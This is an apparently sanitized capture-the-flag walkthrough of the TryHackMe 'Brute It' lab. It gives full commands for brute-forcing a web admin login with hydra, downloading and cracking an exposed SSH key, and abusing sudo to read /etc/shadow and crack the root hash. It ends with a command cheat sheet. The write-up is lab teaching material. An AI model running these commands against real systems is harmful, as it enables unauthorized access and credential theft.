# TryHackMe — Brute It (Sanitized Technical Walkthrough & Field Notes)
Date: 2025-10-10  
Author: Shashank Singh  
Platform: TryHackMe (lab) — sanitized for public posting  
Difficulty: Medium

---

## TL;DR
A portable chain: `recon → web discovery → form brute → admin panel artifact (id_rsa) → offline key cracking → SSH user shell → sudo misconfiguration → root`.

---

## Environment & Tools
- Attacker: Kali Linux (VM)  
- Tools: `nmap`, `gobuster`, `hydra`, `curl`, `ssh2john.py`, `john` / `hashcat`, `sudo`, `grep`

> **Note:** All commands use placeholders (`<target>`, `<user>`). Replace only in authorized labs.

---

## Attack chain — step-by-step (sanitized)

### 1) Recon — service enumeration
```bash
nmap -sC -sV -oN nmap_target.txt <target>
```
Goal: find exposed services. Commonly the box exposes SSH (22) and HTTP (80).

---

### 2) Web enumeration — directory discovery
```
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html
```
Look for admin pages and hidden paths (e.g., `/admin`). Inspect HTML source for form fields and messages.

---

### 3) Brute-force web login (form)
Hydra pattern example (sanitized):
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> \
  http-post-form "/admin/:user=^USER^&pass=^PASS^:invalid" -V -f -t 6
```
Key: use the correct POST path, field names, and the failure string shown on the login page.

---

### 4) Post-auth enumeration — extract artifacts
After login, enumerate the panel for downloads or exposed data. Example (sanitized):
```
curl http://<target>/admin/panel/id_rsa -o id_rsa
chmod 600 id_rsa
```
**Do not** commit or upload actual key files. If you save keys locally for lab use, keep them offline and never push them to a public repo.

---

### 5) Convert and crack passphrase-protected key (offline)
```
/opt/john/ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
When the passphrase is recovered, use it to unlock the key for SSH.

---

### 6) Acquire a user shell via SSH
```
ssh -i id_rsa <user>@<target>
# Enter the cracked passphrase when prompted
```
Collect user-level artifacts, run `sudo -l`, check for misconfigurations.

---

### 7) Privilege escalation — `sudo -l` & root hash
If `sudo -l` shows NOPASSWD for trivial binaries (e.g., `/bin/cat`), you can read critical files:
```
sudo -l
sudo cat /etc/shadow | grep '^root:' > root.hash
john --format=sha512crypt root.hash --wordlist=/usr/share/wordlists/rockyou.txt
su -  # use cracked password
```
This is lab-oriented. In real environments, reading `/etc/shadow` is privileged and must never be attempted without permissions.

---

## Portable logic / takeaways
- Inspect HTML & form fields before brute forcing — the failure string and parameter names matter.  
- Web panels that allow file downloads are high-value; keys found there are immediate escalation vectors.  
- `sudo -l` is a fast, low-noise check that often reveals misconfigurations.  
- Offline cracking works only against weak passphrases — enforce strong passphrase policies in production.

---

## Sanitation & responsible disclosure
- This writeup is intentionally sanitized: no IPs, no flags, no platform-specific URLs.  
- Use these notes only in authorized environments (your lab, HTB/THM boxes you own or are authorized to test).  
- Never disclose sensitive artifacts or private keys publicly.

---

## Commands cheat-sheet (sanitized)
```
nmap -sC -sV -oN nmap_target.txt <target>
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> \
  http-post-form "/admin/:user=^USER^&pass=^PASS^:invalid" -V -f -t 6
curl http://<target>/admin/panel/id_rsa -o id_rsa
chmod 600 id_rsa
/opt/john/ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
ssh -i id_rsa <user>@<target>
sudo -l
```

---


